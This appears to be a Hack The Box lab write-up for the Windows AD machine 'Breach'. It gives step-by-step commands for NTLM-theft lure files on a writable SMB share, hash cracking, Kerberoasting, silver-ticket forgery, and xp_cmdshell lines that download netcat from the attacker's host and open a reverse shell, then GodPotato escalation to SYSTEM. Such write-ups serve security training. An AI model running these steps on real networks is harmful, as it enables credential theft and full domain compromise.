---
type: challenge
platform: Hack The Box
category: "machines"
difficulty: "medium"
status: Documents
date_started: 2026-09-08
date_completed: 2026-09-08
tags:
  - htb
  - machine
  - windows
  - active_directory
  - smb
  - ntlm_theft
  - responder
  - kerberoasting
  - silver_ticket
  - mssql
  - godpotato
---

# Breach

## Overview

**Category:** machines (Windows / Active Directory)
**Difficulty:** medium
**Platform:** Hack The Box
**Date:** 2026-09-08

> [!note] Challenge Scenario
>
> Breach is a Windows domain controller box centered on credential harvesting and Kerberos abuse. Guest access to a writable SMB share allows dropping NTLM-coercion lure files. A NetNTLMv2 hash is captured with Responder and cracked; BloodHound uncovers a Kerberoastable MSSQL service account; a silver ticket is forged as `Administrator` to become SQL `sysadmin`; `xp_cmdshell` gives code execution, and `SeImpersonatePrivilege` (GodPotato) escalates to `NT AUTHORITY\SYSTEM`.

## Enumeration

```bash
nmap -p- $RHOST --open
# 135, 139, 389, 445, 1433, ... -> SMB (445) and MSSQL (1433)

netexec smb $RHOST -u guest -p '' --shares
# Anonymous/guest null session USERS allowed on a 'share' share: READ,WRITE
```

SMB **signing is enabled** → no relay; I used coercion instead.

## Vulnerability (attack chain)

| # | Vulnerability | Component | Impact |
|---| --- | --- | --- |
| 1 | Guest-writable SMB share | `share` | reachable drop zone for NTLM lure files |
| 2 | NTLM authentication coercion | Windows Explorer/SMB client | leaks NetNTLMv2 hash of anyone who browses the folder |
| 3 | Weak user password `Computer1` | `Julia.Wong` | hash cracks instantly |
| 4 | Kerberoasting (SPN on a user account) | `svc_mssql` | TGS requestable by any authenticated user, crackable offline |
| 5 | Weak service password `Trustno1` | `svc_mssql` | TGS cracks → yields NTLM hash of the service account |
| 6 | Forgeable silver ticket (known NTLM hash of SPN owner) | MSSQL | impersonate `Administrator` → SQL `sysadmin` on MSSQL |
| 7 | `xp_cmdshell` | MSSQL Server | OS command execution as `svc_mssql` |
| 8 | `SeImpersonatePrivilege` + OXID resolver | Windows RPC/DCOM | GodPotato → `NT AUTHORITY\SYSTEM` |

## Exploitation

### Step 1 — NTLM theft via the writable share

I generated lure files and dropped them in the share's user folder. The moment anyone opens/renders that folder in Explorer, Windows auto-authenticates to my SMB listener.

```bash
python3 ntlm_theft.py -g all -s $MY_IP -f lure
smbclient //$RHOST/share -U 'guest%' <<'EOF'
recurse ON
prompt OFF
cd <user folder>
mput lure/*
EOF

sudo responder -I tun0
```

Responder caught a connection from `BREACH\Julia.Wong`:

```text
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:...:...:...:Computer1-ish...
```

### Step 2 — Crack the hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt julia.hash
# Computer1        (Julia.Wong)
```

`Julia.Wong : Computer1` — and `user.txt` is readable from the `share` share with these creds.

### Step 3 — AD enumeration + Kerberoast

```bash
rusthound-ce --domain breach.vl -u Julia.Wong -p Computer1 -z   # or bloodhound-python

netexec ldap $RHOST -u Julia.Wong -p Computer1 --kerberoasting out.hash
# sAMAccountName: svc_mssql
# SPN: MSSQLSvc/breachdc.breach.vl:1433

john --wordlist=/usr/share/wordlists/rockyou.txt out.hash
# Trustno1        (?)
```

BloodHound also gives me the SIDs needed for the ticket:
- Domain SID: `S-1-5-21-2330692793-3312915120-706255856`
- `svc_mssql` object SID: `S-1-5-21-2330692793-3312915120-706255856-1115`

### Step 4 — Silver ticket (sysadmin on MSSQL)

`svc_mssql` alone only maps to SQL `guest` (no sysadmin), so `xp_cmdshell` can't be enabled directly. But the account owns the SPN and its password is known → I forge a TGS for the MSSQL service impersonating **Administrator (RID 500)**:

```bash
iconv -f ASCII -t UTF-16LE <(printf "Trustno1") | openssl dgst -md4
# MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c

impacket-ticketer \
  -domain-sid S-1-5-21-2330692793-3312915120-706255856 \
  -nthash 69596c7aa1e8daee17f8e78870e25a5c \
  -domain breach.vl \
  -spn MSSQLSvc/breachdc.breach.vl:1433 \
  -user-id 500 \
  Administrator

export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass breach.vl -windows-auth
# SQL> SELECT SYSTEM_USER;   ->  BREACH\Administrator (sysadmin)
```

### Step 5 — xp_cmdshell and SYSTEM

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell 'powershell -c "wget -usebasicparsing http://$MY_IP:8888/nc64.exe -o C:\Windows\Temp\nc64.exe"'
xp_cmdshell 'C:\Windows\Temp\nc64.exe -e cmd $MY_IP 1234'
```

```text
C:\Temp> whoami /priv
SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
```

Standard Potato teritory — GodPotato for the SYSTEM token:

```text
C:\Temp> .\Godpotato.exe -cmd "powershell -e <BASE64_REVERSE_SHELL>"
```

SYSTEM shell → `root.txt`.

> [!info] Tools Used
>
> - `ntlm_theft`, `responder`
> - `john` / `hashcat` (NetNTLMv2 `5600`, krb5tgs `13100`)
> - `bloodhound(-python)` / RustHound-CE, `netexec`
> - Impacket: `GetUserSPNs`, `ticketer`, `mssqlclient`
> - `GodPotato(-NET4)`, `nc64.exe`

## Flags

- **user.txt:** `HTB{...}`
- **root.txt:** `HTB{...}`

## References

- https://0xdf.gitlab.io/2026/02/10/htb-breach.html
- https://dev.to/exploitnotes/hackthebox-breach-writeup-4loj
- https://exploitnotes.hashnode.dev/hackthebox-breach-writeup
- https://byt3n33dl3.substack.com/p/htb-breach-windows-medium
- https://www.jaccostraathof.nl/vulnlab-breach/